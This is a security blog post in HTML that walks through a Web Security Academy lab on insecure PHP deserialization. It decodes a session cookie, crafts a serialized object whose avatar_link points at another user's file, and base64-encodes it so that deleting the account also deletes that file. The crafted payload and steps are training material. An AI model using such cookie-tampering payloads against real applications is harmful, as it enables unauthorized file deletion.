<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>[Web Security Academy] Insecure Deserialization (1) | Grey Zone</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.) Lab 3: Using application functionality to exploit insecure deserializati">
<meta property="og:type" content="article">
<meta property="og:title" content="[Web Security Academy] Insecure Deserialization (1)">
<meta property="og:url" content="http://yoursite.com/2020/07/07/Web-Security-Academy-Java-deserialization/index.html">
<meta property="og:site_name" content="Grey Zone">
<meta property="og:description" content="(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.) Lab 3: Using application functionality to exploit insecure deserializati">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-07-07T08:09:35.000Z">
<meta property="article:modified_time" content="2020-07-08T07:12:31.906Z">
<meta property="article:author" content="Grey Deng">
<meta property="article:tag" content="Offsec">
<meta property="article:tag" content="Web_Security_Academy">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Grey Zone" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Grey Zone</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">Offsec, Game Design and More</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Web-Security-Academy-Java-deserialization" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/" class="article-date">
  <time datetime="2020-07-07T08:09:35.000Z" itemprop="datePublished">2020-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      [Web Security Academy] Insecure Deserialization (1)
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.)</p>
<h1 id="Lab-3-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-3-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab 3: Using application functionality to exploit insecure deserialization"></a>Lab 3: Using application functionality to exploit insecure deserialization</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&#39;s home directory.</span><br><span class="line">You can access your own account using the following credentials: wiener:peter</span><br><span class="line">You also have access to a backup account: gregg:rosebud</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol>
<li><p>Notice that “My Account” Page Cookie after login:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: session&#x3D;Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJOWDVsc21ucVI5TWZTb2wwQVZIRTRRbU40R3lsYW9yZSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</span><br></pre></td></tr></table></figure>
</li>
<li><p>Decode the base64 cookie:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:6:&quot;wiener&quot;;s:12:&quot;access_token&quot;;s:32:&quot;NX5lsmnqR9MfSol0AVHE4QmN4Gylaore&quot;;s:11:&quot;avatar_link&quot;;s:19:&quot;users&#x2F;wiener&#x2F;avatar&quot;O30%3d</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>Take note that <strong>avatar_link</strong> is referred in the cookie. Meanwhile, <strong>Delete Account</strong> button sends a post request to delete the current account. To delete the morale.txt file from Carlo’s home directory, it is clear that crafting the cookie and delete the account is one possible way.</p>
<ol start="3">
<li><p>Craft the cookie:</p>
<pre>
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"OsTWRNgOgwIgdfjwDk6SgFT5iKZTbHx8";s:11:"avatar_link";<b>s:23:"/home/carlos/morale.txt"</b>;}
</pre>

</li>
</ol>
<p>Encode it with base64:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Ik9zVFdSTmdPZ3dJZ2RmandEazZTZ0ZUNWlLWlRiSHg4IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30&#x3D;</span><br></pre></td></tr></table></figure></p>
<ol start="4">
<li>Replace the cookie with the crafted one when delete the account.</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/07/Web-Security-Academy-Java-deserialization/" data-id="ckcd03koz0000goutf3cq5dci" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Security-Academy/" rel="tag">Web_Security_Academy</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/07/08/Web-Security-Academy-SQL-Injection-1/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          [Web Security Academy] SQL Injection (1)
        
      </div>
    </a>
  
  
    <a href="/2020/07/04/HTB-Walkthrough-Blunder/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">[HTB Hints] Blunder</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB/" rel="tag">HTB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web-Security-Academy/" rel="tag">Web_Security_Academy</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/HTB/" style="font-size: 10px;">HTB</a> <a href="/tags/Offsec/" style="font-size: 20px;">Offsec</a> <a href="/tags/Web-Security-Academy/" style="font-size: 15px;">Web_Security_Academy</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/07/08/Web-Security-Academy-SQL-Injection-1/">[Web Security Academy] SQL Injection (1)</a>
          </li>
        
          <li>
            <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/">[Web Security Academy] Insecure Deserialization (1)</a>
          </li>
        
          <li>
            <a href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Hints] Blunder</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 Grey Deng<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>